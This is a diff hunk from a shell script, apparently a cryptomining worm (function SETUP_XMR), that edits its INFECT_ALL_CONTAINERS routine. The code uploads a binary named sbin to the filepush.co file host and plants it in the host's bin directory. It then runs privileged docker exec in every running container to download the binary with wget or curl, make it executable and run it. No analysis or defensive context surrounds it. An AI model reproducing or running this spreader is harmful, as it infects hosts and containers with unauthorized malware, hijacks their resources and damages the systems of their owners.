@@ -109,7 +109,7 @@ function SETUP_XMR() {
 # Infect all containers
 function INFECT_ALL_CONTAINERS() {
     UPSPINTEST=$(curl --upload-file /root/sbin https://filepush.co/upload/) || { echo "Failed to upload file"; exit 1; }
-    cp ./sbin /host/bin/sbin || { echo "Failed to copy sbin"; exit 1; }
+    cp /root/sbin /host/bin/sbin || { echo "Failed to copy sbin"; exit 1; }
 
     docker ps --quiet | while read -r container_id; do
         docker exec --privileged -d "$container_id" sh -c "apk update; apk add wget curl; mkdir -p /var/tmp/; wget --no-check-certificate $UPSPINTEST -O /var/tmp/sbin; chmod +x /var/tmp/sbin; /var/tmp/sbin || curl -sLk $UPSPINTEST -o /var/tmp/sbin" || { echo "Failed to infect container $container_id"; exit 1; }
